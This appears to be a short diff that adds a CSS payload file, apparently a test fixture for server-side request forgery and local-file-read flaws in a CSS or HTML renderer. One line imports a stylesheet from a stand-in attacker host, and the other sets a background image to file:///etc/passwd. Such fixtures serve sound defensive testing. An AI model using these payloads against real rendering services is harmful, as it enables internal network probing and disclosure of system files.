@@ -1,0 +1,2 @@
+@import url("http://ATTACKER-HOST/css-import-ssrf");
+body{background:url("file:///etc/passwd")}
